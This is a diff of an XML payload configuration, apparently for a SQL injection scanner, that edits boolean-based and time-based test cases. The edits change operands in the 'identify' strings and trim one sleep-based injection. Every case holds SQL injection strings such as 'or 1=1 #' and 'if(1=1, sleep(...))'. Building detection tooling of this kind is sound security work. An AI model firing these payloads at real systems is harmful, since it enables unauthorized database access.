@@ -62,7 +62,7 @@
         <case id="8">
             <inject>" or 1=1 #</inject>
             <inject2>NULL</inject2>
-            <identify>" Or 'ab' = 'ab' #</identify>
+            <identify>" Or "ab" = "ab" #</identify>
             <check>NULL</check>
         </case>
         <case id="9">
@@ -74,19 +74,19 @@
         <case id="10">
             <inject>") or 1=1 #</inject>
             <inject2>NULL</inject2>
-            <identify>") Or 'ab' = 'ab' #</identify>
+            <identify>") Or "ab" = "ab" #</identify>
             <check>NULL</check>
         </case>
         <case id="11">
             <inject>1524024 or 1=1 #</inject>
             <inject2>NULL</inject2>
-            <identify>1816807 Or 'ab' = 'ab' #</identify>
+            <identify>1816807 Or 123 = 123 #</identify>
             <check>NULL</check>
         </case>
         <case id="12">
             <inject>1524024) or 1=1 #</inject>
             <inject2>NULL</inject2>
-            <identify>1816807) Or 'ab' = 'ab' #</identify>
+            <identify>1816807) Or 123 = 123 #</identify>
             <check>NULL</check>
         </case>
         <case id="13">
@@ -98,7 +98,7 @@
         <case id="14">
             <inject>" and 1=2 #</inject>
             <inject2>NULL</inject2>
-            <identify>" aND 'abc' = 'bbc' #</identify>
+            <identify>" aND "ab" = "ab" #</identify>
             <check>NULL</check>
         </case>
         <case id="15">
@@ -110,25 +110,25 @@
         <case id="16">
             <inject>") and 1=2 #</inject>
             <inject2>NULL</inject2>
-            <identify>") And 'abc' = 'bbc' #</identify>
+            <identify>") And "ab" = "ab" #</identify>
             <check>NULL</check>
         </case>
         <case id="17">
             <inject>1524024 and 1=2 #</inject>
             <inject2>NULL</inject2>
-            <identify>1816807 anD 'abc' = 'bbc' #</identify>
+            <identify>1816807 anD 456 = 456 #</identify>
             <check>NULL</check>
         </case>
         <case id="18">
             <inject>1524024) and 1=2 #</inject>
             <inject2>NULL</inject2>
-            <identify>1816807) ANd 'abc' = 'bbc' #</identify>
+            <identify>1816807) ANd 78 = 78 #</identify>
             <check>NULL</check>
         </case>
     </BoolBasedTestCase>
     <TimeBasedTestCase num="6">
         <case id="1">
-            <inject>1' and if(1=1, sleep(</inject>
+            <inject>' and if(1=1, sleep(</inject>
             <injectPost>), 0) #</injectPost>
             <identify>' and if(1=1, sleep(0), 0) #</identify>
             <identifyPost>NULL</identifyPost>
